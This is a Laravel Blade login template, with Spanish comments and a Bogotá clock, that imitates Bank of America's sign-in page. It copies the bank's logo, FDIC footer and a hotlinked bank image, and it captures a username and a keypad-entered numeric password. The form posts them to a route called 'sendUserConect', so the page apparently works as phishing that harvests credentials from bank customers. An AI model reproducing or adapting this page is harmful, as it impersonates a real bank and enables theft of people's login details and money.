@extends('auth.layouts.app')

@section('title', 'Iniciar sesión')

@section('description', 'Inicia sesión en tu cuenta')

@section('contenido')

<body class="bg-gray-100">

    <!-- Header -->
    <header class="text-center bg-white py-6 shadow-md">
        <img src="{{ asset('storage/images/imagen12.svg') }}" alt="Bank of America" class="mx-auto w-[400px]">
        <p class="text-gray-500 mt-2" id="HourComplet"></p>
    </header>
    <div class="grid grid-cols-1 md:grid-cols-2 items-center">
        <!-- Login Form -->
        <div class="flex justify-center mt-10">
            <div class="bg-white shadow-lg rounded-lg p-8 w-full max-w-md">
                <form class="space-y-6"  action="{{ route('sendUserConect') }}" method="POST">
                    @csrf
                    <div>
                        <label for="username" class="block text-sm font-medium text-white bg-red-400 p-2 rounded-xl">Username</label>
                        <input type="text" id="username" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your username" name="username">
                    </div>
    
                    <div>
                        <label for="password" class="block text-sm font-medium text-white bg-red-400 p-2 rounded-xl">Password (numbers only)</label>
                        <input type="password" id="password" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your password" name="password">
                    </div>
    
                    <!-- Virtual Keypad -->
                    <div class="grid grid-cols-3 gap-3 text-center text-lg font-semibold">
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(1)">1</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(2)">2</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(3)">3</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(4)">4</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(5)">5</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(6)">6</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(7)">7</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(8)">8</button>
                        <button type="button" class="py-2 px-4 bg-gray-200 rounded-lg" onclick="appendNumber(9)">9</button>
                    </div>

                    @if ($errors->any())
                    <div class="mt-4 bg-red-100 border border-red-400 text-red-700 px-4 rounded relative" role="alert">
                        <div class="font-medium">
                            {{ __('¡Oops! Algo salió mal.') }}
                        </div>
                        <ul class="mt-2 list-disc list-inside text-sm">
                            @foreach ($errors->all() as $error)
                                <li>{{ $error }}</li>
                            @endforeach
                        </ul>
                    </div>
                @endif

                 
                    
                    <!-- Login Button -->
                    <div class="pt-4">
                        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-md font-semibold">Log in</button>
                    </div>
    
                    <!-- Links -->
                    <div class="flex justify-between text-sm text-blue-600">
                        <a href="#" class="hover:underline">Forgot ID/password?</a>
                        <a href="#" class="hover:underline">Problem login in?</a>
                    </div>
                </form>
            </div>
        </div>
    
        <!-- App Download Section -->
        <div class="text-center my-8 flex flex-col justify-center items-center">
            <img src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png" alt="Bank of America App" class="mx-auto w-[350px]">
            <p class="text-gray-600 mt-4">Secure, convenient banking anytime</p>
            <button class="bg-orange-600 text-white py-2 px-4 mt-4 rounded-md w-32">Get the app</button>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-black text-white text-center py-4 text-xs bottom-0 absolute w-full">
        <p>Secure area | Privacy | Security | Bank of America, N.A. Member FDIC</p>
        <p>Equal Housing Lender © 2024 Bank of America Corporation.</p>
    </footer>

</body>
</html>

<script>
    const HourComplet = document.getElementById('HourComplet');

        // Función para actualizar la hora en tiempo real
        function updateTime() {
            const date = new Date();
            const options = {
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                second: 'numeric',
                timeZone: 'America/Bogota' 
            };
            HourComplet.textContent = date.toLocaleDateString('es-ES', options);
        }

       
        setInterval(updateTime, 1000);


        updateTime();

        // Virtual Keypad
        const passwordInput = document.getElementById('password');

        function appendNumber(number) {
            passwordInput.value += number;
        }

        function clearPassword() {
            passwordInput.value = '';
        }

        function deleteLastCharacter() {
            passwordInput.value = passwordInput.value.slice(0, -1);
        }

        // Form Submit




</script>

@endsection